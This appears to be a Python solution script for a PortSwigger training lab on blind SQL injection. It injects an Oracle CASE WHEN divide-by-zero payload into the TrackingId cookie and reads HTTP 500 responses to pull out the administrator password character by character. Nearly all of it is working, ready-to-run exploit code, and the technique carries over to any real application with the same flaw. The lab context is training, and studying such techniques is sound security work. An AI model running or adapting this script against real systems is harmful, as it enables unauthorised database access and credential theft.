# Lab 12 — Blind SQL Injection: Conditional Errors
# PortSwigger: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
#
# Vulnerability: TrackingId cookie
# Aim:           Extract the administrator password using HTTP 500 as the TRUE signal
#
# DB: Oracle (identified by FROM dual requirement and TO_CHAR(1/0) error trick)
#
# Signal: HTTP 500 (division-by-zero error) = condition TRUE
#         HTTP 200 (returns harmless 'a')   = condition FALSE
#
# Technique: CASE WHEN <condition> THEN TO_CHAR(1/0) ELSE 'a' END
#   - If condition is TRUE  → 1/0 executes → Oracle raises ORA-01476 → HTTP 500
#   - If condition is FALSE → 'a' is returned  → HTTP 200
#
# Usage: python lab12.py <url>

import sys
import requests
import urllib3
from proxies import proxies
from sqli_utils import banner, section

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PASSWORD_LENGTH = 20
CHARSET         = "abcdefghijklmnopqrstuvwxyz0123456789"


if __name__ == "__main__":
    banner()
    section("LAB 12 — BLIND SQLi: CONDITIONAL ERRORS (ORACLE)")

    if len(sys.argv) != 2:
        print("  Usage: python lab12.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = requests.Session()
    session.verify   = False
    session.proxies  = proxies

    session.get(url)
    tracking_id = session.cookies.get("TrackingId")

    print(f"\n  TrackingId: {tracking_id}")
    print(f"  Enumerating {PASSWORD_LENGTH} characters — HTTP 500 = match\n")

    password = ""

    for i in range(1, PASSWORD_LENGTH + 1):
        for char in CHARSET:
            # CASE injects a divide-by-zero error only when the char matches
            payload = (
                f"{tracking_id}' AND ("
                f"SELECT CASE WHEN SUBSTR(password,{i},1)='{char}' "
                f"THEN TO_CHAR(1/0) ELSE 'a' END "
                f"FROM users WHERE username='administrator')='a'--"
            )
            response = session.get(url, cookies={"TrackingId": payload})

            if response.status_code == 500:
                password += char
                sys.stdout.write(f"\r  ★  Found so far: {password}")
                sys.stdout.flush()
                break
            else:
                sys.stdout.write(f"\r  ⟳  Position {i}: trying '{char}'  ")
                sys.stdout.flush()

    print(f"\n\n  ★  Administrator password: {password}")
